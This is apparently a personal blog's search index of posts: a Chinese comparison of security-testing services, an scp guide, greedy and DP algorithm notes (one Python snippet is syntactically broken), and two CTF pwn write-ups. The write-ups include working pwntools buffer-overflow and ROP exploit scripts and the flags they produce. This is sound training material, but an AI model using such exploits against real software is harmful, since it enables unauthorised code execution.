<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>資安檢測服務比較</title>
    <link href="/2022/10/16/%E8%B3%87%E5%AE%89%E6%AA%A2%E6%B8%AC%E6%9C%8D%E5%8B%99%E6%AF%94%E8%BC%83/"/>
    <url>/2022/10/16/%E8%B3%87%E5%AE%89%E6%AA%A2%E6%B8%AC%E6%9C%8D%E5%8B%99%E6%AF%94%E8%BC%83/</url>
    
    <content type="html"><![CDATA[<p>最近在面試的時候有些題目會讓我們比較幾種資安檢測的方式有甚麼差異，因為我覺得我好像也不是了解得很清楚，所以決定做個筆記紀錄一下。</p><p>下面比較幾個容易混亂的服務: 源碼檢測、弱點掃描、滲透測試、紅隊演練</p><h1 id="源碼檢測"><a href="#源碼檢測" class="headerlink" title="源碼檢測"></a>源碼檢測</h1><p>只有這種方式屬於白箱檢測，會使用自動化工具對程式碼進行靜態分析，找出目標系統的程式弱點。<br>掃描的工具上，付費軟體常見的有<a href="https://www.microfocus.com/zh-tw/products/static-code-analysis-sast/overview">Micro Focus Fortify</a>以及<a href="https://developer.ibm.com/">IBM Security AppScan</a>，而免費工具則有<a href="https://www.sonarqube.org/">SonarQube</a>，PHP&#x2F;Java&#x2F;C#屬於免費的範疇，其他某些語言可以透過購買授權來做使用。</p><p>下面三種就屬於黑箱的部分了，是在沒有提供原始程式碼的情況下去進行檢測:</p><h1 id="弱點掃描"><a href="#弱點掃描" class="headerlink" title="弱點掃描"></a>弱點掃描</h1><p>弱掃主要是透過自動化工具偵測作業系統與軟體系統的已知弱點，可以參考<a href="https://cve.mitre.org/cve/search_cve_list.html">CVE網站</a>去查看各自所使用的一些技術與環境有哪些已知的漏洞，檢查該漏洞是否有被修補，前面提到的兩個付費軟體Fortify和AppScan也都有提供弱點掃描工具，純弱掃的商業軟體有<a href="https://www.rapid7.com/products/nexpose/">Nexpose</a>，而免費軟體有<a href="https://owasp.org/www-project-zap/">ZAP</a>, <a href="https://www.openvas.org/">OpenVAS</a>, <a href="https://zh-tw.tenable.com/products/nessus">Nessus</a>等等。</p><h1 id="滲透測試"><a href="#滲透測試" class="headerlink" title="滲透測試"></a>滲透測試</h1><p>滲透測試和弱掃一樣是去找系統漏洞，差別是他是在指定的時間內，對指定的目標系統，由人(駭客)去嘗試進行入侵、攻破系統，透過駭客的經驗來分析目標的弱點，可以找到一些自動軟體無法發掘之漏洞，甚至破壞掉軟體系統，雖然也有自動化軟體(Fortify,AppScan,Rapid7)，不過多數問題主要還是要由人來找出。</p><h1 id="紅隊演練"><a href="#紅隊演練" class="headerlink" title="紅隊演練"></a>紅隊演練</h1><p>紅隊演練是滲透測試的擴大版，不限定範圍，模擬駭客針對整個組織進行全面入侵演練，某種程度上可以看作是合法的APT攻擊。駭客會透過各種情資與手段進行攻擊，測試目標組織的安全防護體系與響應能力。</p><h1 id="各種服務比較表"><a href="#各種服務比較表" class="headerlink" title="各種服務比較表"></a>各種服務比較表</h1><p><img src="https://i.imgur.com/n9x3cTW.png" alt="比較表"><br>來源：<a href="https://www.chtsecurity.com/service/m108#sec5">中華資安</a></p><h1 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h1><p><a href="https://www.chtsecurity.com/service/m108#sec5">中華資安-紅隊演練服務</a><br><a href="https://www.hcm86.com/%E5%BC%B1%E9%BB%9E%E6%8E%83%E6%8F%8F%E3%80%81%E6%BB%B2%E9%80%8F%E6%8E%83%E6%8F%8F%E8%88%87%E5%8E%9F%E5%A7%8B%E7%A2%BC%E6%8E%83%E6%8F%8F%E6%9C%89%E4%BD%95%E4%B8%8D%E5%90%8C%EF%BC%9F">凡塵文集-弱點掃描、滲透掃描與原始碼掃描有何不同？</a><br><a href="https://blog.csdn.net/qq_41901122/article/details/124886372">CSDN-渗透测试和红队演练有什么区别？</a></p>]]></content>
    
    
    <categories>
      
      <category>Learning Note</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CyberSecurity</tag>
      
      <tag>SecurityTesting</tag>
      
      <tag>interview</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python3 ssh 傳檔案</title>
    <link href="/2022/04/05/python3-ssh-%E5%82%B3%E6%AA%94%E6%A1%88/"/>
    <url>/2022/04/05/python3-ssh-%E5%82%B3%E6%AA%94%E6%A1%88/</url>
    
    <content type="html"><![CDATA[<p>本地這邊需要安裝 openssh-client<br>伺服器那邊需要安裝 openssh-server</p><h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><h3 id="從本地傳到遠端"><a href="#從本地傳到遠端" class="headerlink" title="從本地傳到遠端"></a>從本地傳到遠端</h3><p>$ scp 要傳的檔案 遠端的帳號@遠端的位置(可以是ip，也可以是網址):遠端要傳檔案的資料夾。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">     $  scp FileName <span class="hljs-string">&quot;User&quot;</span>@server:server-location/ &#123;enter&#125;<br></code></pre></td></tr></table></figure><p>EX : 以limiu的使用者身份把當前目錄下的*(所有檔案)傳到203.64.125.XX伺服器中的&#x2F;home&#x2F;limiu&#x2F;資料夾位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$  scp ./* <span class="hljs-string">&quot;limiu&quot;</span>@203.64.125.XX:/home/limiu/ &#123;enter&#125;<br></code></pre></td></tr></table></figure><p>PS : 輸入後如果遠端的帳號有密碼會要求您輸入。<br>User那邊的雙引號可加可不加(如果您的帳號沒有順殊字元的話。</p><h3 id="從遠端傳到本地"><a href="#從遠端傳到本地" class="headerlink" title="從遠端傳到本地"></a>從遠端傳到本地</h3><p>$ scp 遠端的帳號@遠端的位置(可以是ip，也可以是網址):遠端要傳的檔案 傳回來的資料夾位置。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$  scp <span class="hljs-string">&quot;User&quot;</span>@server:server-location/FileName local-location/ &#123;enter&#125;<br></code></pre></td></tr></table></figure><p>EX : 以limiu的使用者身份把203.64.125.XX伺服器中的&#x2F;home&#x2F;limiu&#x2F;這個位置下的*(所有東西)下載到本地端的.(當前目錄)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$  scp <span class="hljs-string">&quot;limiu&quot;</span>@203.64.125.XX:/home/limiu/* . &#123;enter&#125;<br></code></pre></td></tr></table></figure><p>PS : 輸入後如果遠端的帳號有密碼會要求您輸入。<br>User那邊的雙引號可加可不加(如果您的帳號沒有順殊字元的話。</p><h2 id="P-S"><a href="#P-S" class="headerlink" title="P.S."></a>P.S.</h2><p>如果遠端(伺服器)不是使用預設的Port可以加入 -P 參數。 EX:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$  scp -P 1234 FileName <span class="hljs-string">&quot;User&quot;</span>@server:server-location/ &#123;enter&#125;<br></code></pre></td></tr></table></figure><h2 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h2><p><a href="https://blog.skynimo.com/blog/post/325025436-scp---ssh-%E7%9A%84%E9%81%A0%E7%AB%AF%E6%AA%94%E6%A1%88%E5%82%B3%E8%BC%B8%E6%8C%87%E4%BB%A4">Nimo的成長大海-ssh的遠端檔案傳輸指令</a></p>]]></content>
    
    
    <categories>
      
      <category>Environment stuff</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>ssh</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup-split</title>
    <link href="/2022/01/12/Writeup-split/"/>
    <url>/2022/01/12/Writeup-split/</url>
    
    <content type="html"><![CDATA[<ol><li><code>file split</code></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ file <span class="hljs-built_in">split</span><br><span class="hljs-built_in">split</span>: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), <br>dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="hljs-keyword">for</span> GNU/Linux 3.2.0, <br>BuildID[sha1]=98755e64e1d0c1bff48fccae1dca9ee9e3c609e2, not stripped<br></code></pre></td></tr></table></figure><ol start="2"><li>gdb-peda, checksec</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gdb-peda <span class="hljs-built_in">split</span><br>Reading symbols from <span class="hljs-built_in">split</span>...<br>(No debugging symbols found <span class="hljs-keyword">in</span> <span class="hljs-built_in">split</span>)<br>gdb-peda$ checksec<br>CANARY    : disabled<br>FORTIFY   : disabled<br>NX        : ENABLED<br>PIE       : disabled<br>RELRO     : Partial<br>gdb-peda$<br></code></pre></td></tr></table></figure><ol start="3"><li><code>r2 split</code>, <code>aa</code>, <code>afl</code>, I notice the special function <strong>pwnme</strong>, <strong>usefulFunction</strong>.</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">[0x00400742]&gt; afl<br>0x004005b0    1 42           entry0<br>0x004005f0    4 42   -&gt; 37   sym.deregister_tm_clones<br>0x00400620    4 58   -&gt; 55   sym.register_tm_clones<br>0x00400660    3 34   -&gt; 29   sym.__do_global_dtors_aux<br>0x00400690    1 7            entry.init0<br>0x004006e8    1 90           sym.pwnme      ====&gt; this one<br>0x00400580    1 6            sym.imp.memset<br>0x00400550    1 6            sym.imp.puts<br>0x00400570    1 6            sym.imp.printf<br>0x00400590    1 6            sym.imp.read<br>0x00400742    1 17           sym.usefulFunction     ====&gt; this one<br>0x00400560    1 6            sym.imp.system<br>0x004007d0    1 2            sym.__libc_csu_fini<br>0x004007d4    1 9            sym._fini<br>0x00400760    4 101          sym.__libc_csu_init<br>0x004005e0    1 2            sym._dl_relocate_static_pie<br>0x00400697    1 81           main             ====&gt; this one<br>0x004005a0    1 6            sym.imp.setvbuf<br>0x00400528    3 23           sym._init<br></code></pre></td></tr></table></figure><ol start="4"><li>I choose to see the main function first. It seems do nothing but print some strings.</li></ol><p><img src="https://i.imgur.com/6wijIYI.png" alt="Image"></p><ol start="4"><li>go to see another function <strong>pwnme</strong>. we have a input which store at <strong>var_20h(rbp-0x20)</strong>.</li></ol><p><img src="https://i.imgur.com/nvN8Qsf.png" alt="Image"></p><ol start="5"><li>and the usefulfunction is below.</li></ol><p><img src="https://i.imgur.com/NmfH83V.png" alt="Image"></p><ol start="6"><li>we use <code>iz</code> to find an <code>cat / flag.txt</code></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">[0x00400742]&gt; iz<br>[Strings]<br>nth paddr      vaddr      len size section <span class="hljs-built_in">type</span>  string<br>―――――――――――――――――――――――――――――――――――――――――――――――――――――――<br>0   0x000007e8 0x004007e8 21  22   .rodata ascii <span class="hljs-built_in">split</span> by ROP Emporium<br>1   0x000007fe 0x004007fe 7   8    .rodata ascii x86_64\n<br>2   0x00000806 0x00400806 8   9    .rodata ascii \nExiting<br>3   0x00000810 0x00400810 43  44   .rodata ascii Contriving a reason to ask user <span class="hljs-keyword">for</span> data...<br>4   0x0000083f 0x0040083f 10  11   .rodata ascii Thank you!<br>5   0x0000084a 0x0040084a 7   8    .rodata ascii /bin/ls<br>0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt ===&gt; this one<br></code></pre></td></tr></table></figure><ol start="7"><li><p>then we can write our expolit code.<br> we need to padding to the return address, it is 0x20 + 0x8(rbp), then the address of <code>pop rdi ; ret</code>, then address of <code>/bin/cat flag.txt</code>, and <code>sym.imp.system</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><br><span class="hljs-attribute">r</span> = process(&#x27;./split&#x27;)<br><span class="hljs-comment">#r = remote(&#x27;120.114.62.211&#x27;, 6126)</span><br><br><span class="hljs-attribute">padding</span> = b&#x27;A&#x27;*<span class="hljs-number">40</span><br><span class="hljs-attribute">pop_rdi</span> = <span class="hljs-number">0</span>x4007c3<br><span class="hljs-attribute">cat_flag</span> = <span class="hljs-number">0</span>x601060<br><span class="hljs-attribute">syscall</span> = <span class="hljs-number">0</span>x400560<br><br><span class="hljs-comment"># payload = padding</span><br><span class="hljs-comment"># payload += p64(pop_rdi)</span><br><span class="hljs-comment"># payload += p64(cat_flag)</span><br><span class="hljs-comment"># payload += p64(syscall)</span><br><br><span class="hljs-attribute">r</span>.sendline(padding + p64(pop_rdi) + p64(cat_flag) + p64(syscall))  #if <span class="hljs-number">64</span> bit ,or <span class="hljs-number">32</span>bit use p32<br><br><span class="hljs-attribute">r</span>.interactive()<br></code></pre></td></tr></table></figure></li><li><p>then we can run the code and get the flag.</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ python3 exploit_split.py<br>[+] Starting <span class="hljs-built_in">local</span> process <span class="hljs-string">&#x27;./split&#x27;</span>: pid 155<br>[*] Switching to interactive mode<br><span class="hljs-built_in">split</span> by ROP Emporium<br>x86_64<br><br>Contriving a reason to ask user <span class="hljs-keyword">for</span> data...<br>&gt; Thank you!<br>ROPE&#123;a_placeholder_32byte_flag!&#125;<br>[*] Got EOF <span class="hljs-keyword">while</span> reading <span class="hljs-keyword">in</span> interactive<br>$<br></code></pre></td></tr></table></figure><p>ROPE{a_placeholder_32byte_flag!}</p>]]></content>
    
    
    <categories>
      
      <category>Writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CyberSecurity</tag>
      
      <tag>PWN</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup-pass</title>
    <link href="/2022/01/10/Writeup-pass/"/>
    <url>/2022/01/10/Writeup-pass/</url>
    
    <content type="html"><![CDATA[<ol><li>use <code>file &lt;file&gt;</code> to take a look. It’s ELF file.</li></ol><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">$ <span class="hljs-keyword">file</span> pass<br>pass: ELF <span class="hljs-number">64</span>-bit LSB <span class="hljs-built_in">executable</span>, x86-<span class="hljs-number">64</span>, <span class="hljs-keyword">version</span> <span class="hljs-number">1</span> (SYSV), dynamically linked, <br>interpreter /lib64/ld-linux-x86-<span class="hljs-number">64</span>.<span class="hljs-keyword">so</span>.<span class="hljs-number">2</span>, BuildID[sha1]=abcfeb57f2bcc8ad99fcba05bb6a05830c5e36d0, <br><span class="hljs-keyword">for</span> GNU/Linux <span class="hljs-number">3.2</span>.<span class="hljs-number">0</span>, not stripped<br></code></pre></td></tr></table></figure><ol start="2"><li><p>use <code>r2 &lt;executable file&gt;</code> to see the flow of the program.<br>  a. <code>aa</code>, <code>afl</code> to see the function of the binary.<br>  b. <code>s &lt;function&gt;</code> seek to the function.<br>  b. <code>VV</code> to see the function(we just set) flow in a graphic way.</p></li><li><p>by r2 VV command, we can see that var_20h is put at rbp-0x20, var_4h is at rbp-0x4.<br><img src="https://user-images.githubusercontent.com/66505819/139246455-3a32ff1c-f05b-4d58-b7a5-2976cc7d66b0.png" alt="image"></p></li><li><p>keep looking, we find that the program store number 1234(0x4d2) at var_4h. And the program will compare it with 0xdeadbeef.<br>if they are the same, program jump to Door open and we’ll find the flag, or we fail.<br><img src="https://user-images.githubusercontent.com/66505819/139246670-c5619595-d225-4ea8-89e0-e1752fe65339.png" alt="image"><br><img src="https://user-images.githubusercontent.com/66505819/139246794-227723d7-fe4c-4f59-92e5-b6c59ef32075.png" alt="image"></p></li><li><p>Our input will be put at var_20h, and we need to change the data that store at var_4h, using boffer overflow. So, we have the script below.</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = process(<span class="hljs-string">&#x27;./pass&#x27;</span>)<br>#r = remote(<span class="hljs-string">&#x27;120.114.62.211&#x27;</span>, <span class="hljs-number">6126</span>)<br><br>payload = b<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">28</span><br><br>r.sendline(payload + p64(<span class="hljs-number">0xdeadbeef</span>))  #<span class="hljs-keyword">if</span> <span class="hljs-number">64</span> bit ,or <span class="hljs-number">32</span>bit use p32<br><br>r.interactive()<br></code></pre></td></tr></table></figure></li><li><p>run the script and get the flag.</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gauss">$ python3 exploit.py<br>[+] Starting <span class="hljs-keyword">local</span> process &#x27;./pass&#x27;: pid <span class="hljs-number">162</span><br>[*] Switching to interactive mode<br>Billy left his <span class="hljs-built_in">key</span> in the locked room.<br>However, he forgot the <span class="hljs-built_in">token</span> of the room.<br><span class="hljs-keyword">Do</span> you know what&#x27;s the <span class="hljs-built_in">key</span>?Door <span class="hljs-keyword">open</span>. OwO<br>FLAG&#123;xtnntfhzflpttvxvzzbfjfnxbjvrzxdfvzlvhpt&#125;<br>hello hacker!<br>[*] Process &#x27;./pass&#x27; stopped with exit <span class="hljs-built_in">code</span> <span class="hljs-number">0</span> (pid <span class="hljs-number">162</span>)<br>[*] Got <span class="hljs-built_in">EOF</span> <span class="hljs-keyword">while</span> reading in interactive<br>$<br></code></pre></td></tr></table></figure><p>the flag is: FLAG{xtnntfhzflpttvxvzzbfjfnxbjvrzxdfvzlvhpt}</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>Writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CyberSecurity</tag>
      
      <tag>PWN</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Algo-Greedy</title>
    <link href="/2021/11/16/Algo-Greedy/"/>
    <url>/2021/11/16/Algo-Greedy/</url>
    
    <content type="html"><![CDATA[<h1 id="Activity-Selection-problem"><a href="#Activity-Selection-problem" class="headerlink" title="Activity-Selection problem"></a>Activity-Selection problem</h1><p>pseudocode </p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs text">Greedy-Activity-Selectors(s,f)<br>n = s.length<br>A = &#123;a[1]&#125;<br>k = 1<br>for m = 2 to n<br>if s[m] &gt;= f[k]<br>A = A ∪ &#123;a[m]&#125;<br>k = m<br>return A<br></code></pre></td></tr></table></figure><p>python</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">act_select</span>(<span class="hljs-params">s,f</span>):<br>    n = <span class="hljs-built_in">len</span>(s)<br>    A = <span class="hljs-built_in">set</span>()<br>    A.add(<span class="hljs-number">1</span>)<br>    k = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,n):<br>        <span class="hljs-keyword">if</span> s[m] &gt;= f[k]:<br>            A.add(m)<br>            k = m<br>    <span class="hljs-keyword">return</span> A<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    s = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>,  <span class="hljs-number">6</span>,  <span class="hljs-number">8</span>,  <span class="hljs-number">8</span>,  <span class="hljs-number">2</span>, <span class="hljs-number">12</span>]<br>    f = [<span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">13</span>, <span class="hljs-number">14</span>]<br>    <span class="hljs-built_in">print</span>(act_select(s,f))<br></code></pre></td></tr></table></figure><h1 id="The-Knapsack-problem"><a href="#The-Knapsack-problem" class="headerlink" title="The Knapsack problem"></a>The Knapsack problem</h1><h2 id="Fractional-Knapsack"><a href="#Fractional-Knapsack" class="headerlink" title="Fractional Knapsack"></a>Fractional Knapsack</h2><p>pseudocode</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">Fraction-Knapsack(v,w,W)<br>計算v[i]/w[i], ∀i = 1,2,...,n       =&gt; O(n)  <br>將每件物品根據v[i]/w[i]由大到小排列   =&gt; O(nlogn)<br>依序取物直到總負重達到W貨或物品全被取光為止<br></code></pre></td></tr></table></figure><h2 id="0-1-Knapsack-DP解"><a href="#0-1-Knapsack-DP解" class="headerlink" title="0-1 Knapsack (DP解)"></a>0-1 Knapsack (DP解)</h2><p>沒有greedy-choice property, 所以無法用greedy, 只能用DP解。<br>pseudocode</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text">01-knapsack(n,v,w,W)<br>Let s[0..n, 0..W] be a new array<br>for k = 0 to W<br>s[0,k] = 0<br>for i = 0 to n <br>s[i,0] = 0<br>for k = 1 to W<br>if k &lt; w[i]<br>s[i,k] = s[i-1,k]<br>else<br>s[i,k] = max&#123;s[i-1,k], v[i]+s[i-1,k-w[i]]&#125;<br>return s[n,W]<br></code></pre></td></tr></table></figure><h1 id="Huffman-code"><a href="#Huffman-code" class="headerlink" title="Huffman code"></a>Huffman code</h1><p>pseucode</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">Huffman(s)<br>find least frequence chars c and c&#x27;<br>S&#x27; = remove c and c&#x27; from S, but add char X with f[x] = f[c] + d[c&#x27;]<br>T&#x27; = Huffman(S&#x27;)<br>make leaf X of T&#x27; an interal node by connecting two leaves c and c&#x27; to it<br>return resulting tree<br></code></pre></td></tr></table></figure><p>constructing</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs text">Huffman(c)<br>n ← |C|<br>Q ← C  # initialize the min-priority queue with the character in C<br>for i ← 1 to n-1<br>do allocate a new node z<br>z.left = x = EXTRACT-MIN(Q)<br>z.right = y = EXTRACT-MIN(Q)<br>z.freq = x.freq + y.freq<br>INSERT(Q,z)<br>return EXTRACT-MIN(Q) # return the root of the tree<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Learning Note</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Algorithm</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Algo-DP</title>
    <link href="/2021/11/07/Algo-DP/"/>
    <url>/2021/11/07/Algo-DP/</url>
    
    <content type="html"><![CDATA[<h1 id="The-rod-cutting-problem-1-D"><a href="#The-rod-cutting-problem-1-D" class="headerlink" title="The rod-cutting problem (1-D)"></a>The rod-cutting problem (1-D)</h1><p>pseudocode </p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs text">Bottom-up-cut-rod(p,n)<br>let r[0..n] and s[0..n] be new arrays<br>r[0] ← 0<br>for j ← 1 to n do //compute r[j]<br>r[j] ← -∞<br>for i ← 1 to j do <br>  if r[j] &lt; p[i] + r[j-i]<br>  r[j] ← p[i] + r[j-i]<br>  s[j] ← i<br>return r and s<br></code></pre></td></tr></table></figure><p>in python</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs py">INF = <span class="hljs-number">1000000</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rod</span>-cutting(p,n):<br>r = [<span class="hljs-literal">None</span>] * (n+<span class="hljs-number">1</span>)<br>s = [<span class="hljs-literal">None</span>] * (n+<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,n+<span class="hljs-number">1</span>):<br>r[j] = -INF<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,j+<span class="hljs-number">1</span>):<br><span class="hljs-keyword">if</span> r[j] &lt; p[i] + r[j-i]:<br>r[j] = p[i] + r[j-i]<br>s[j] = i<br><span class="hljs-keyword">return</span> r, s<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>p = [<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">9</span>, <span class="hljs-number">11</span>, <span class="hljs-number">16</span>, <span class="hljs-number">17</span>, <span class="hljs-number">20</span>, <span class="hljs-number">22</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>]<br><span class="hljs-built_in">print</span>(rod-cutting(p,<span class="hljs-number">9</span>))<br></code></pre></td></tr></table></figure><h1 id="Matrix-chain-multiplication-2-D"><a href="#Matrix-chain-multiplication-2-D" class="headerlink" title="Matrix-chain multiplication (2-D)"></a>Matrix-chain multiplication (2-D)</h1><h2 id="Iteration"><a href="#Iteration" class="headerlink" title="Iteration"></a>Iteration</h2><p>pseudocode</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs text">Matrix-chain-order(p)    //bottom-up<br>for i ← 1 to n <br>m[i,i] = 0<br>for l ← 2 to n <br>for i ← 1 to n-l+1 do<br>j 